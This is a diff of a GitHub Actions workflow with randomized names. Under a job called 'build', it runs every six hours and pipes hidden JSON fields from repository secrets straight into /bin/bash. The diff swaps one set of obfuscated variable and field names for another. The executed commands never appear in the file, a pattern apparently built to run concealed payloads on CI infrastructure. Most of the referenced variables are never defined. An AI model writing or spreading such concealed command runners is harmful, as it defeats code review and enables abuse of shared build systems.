@@ -1,25 +1,26 @@
 name: zkmmlkk
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '32 3/6 * * *'
+    - cron: '26 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: zkmmlkk
         env:
-          tid53577: ${{ secrets.tid53577 }}
+          nacl6743: ${{ secrets.nacl6743 }}
         run: |
-          echo $tid53577 | jq -r .zak42741 | /bin/bash
-          echo $sde18 | jq -r .rubpr6981 | /bin/bash
-          echo $c561 | jq -r .ojig26534 | /bin/bash
-          echo $qr3 | jq -r .jjk5144 | /bin/bash
-          echo $dx97431 | jq -r .mp04 | /bin/bash
-          echo $vhhx042 | jq -r .sqo32 | /bin/bash
-          echo $tqbu3 | jq -r .srxd2571 | /bin/bash
-          echo $wfiic108 | jq -r .h93 | /bin/bash
+          echo $nacl6743 | jq -r .bke1917 | /bin/bash
+          echo $t60 | jq -r .ptxwd9 | /bin/bash
+          echo $vlk31672 | jq -r .i9495 | /bin/bash
+          echo $k217 | jq -r .rj8032 | /bin/bash
+          echo $p32637 | jq -r .ufyd83163 | /bin/bash
+          echo $krn871 | jq -r .wgsob971 | /bin/bash
+          echo $pvpw4 | jq -r .uzre180 | /bin/bash
+          echo $hhtu8441 | jq -r .sedu024 | /bin/bash
+          echo $d80022 | jq -r .dbid5 | /bin/bash
+          echo $t1751 | jq -r .ce32 | /bin/bash
+          echo $bkqiu04 | jq -r .i89 | /bin/bash
 
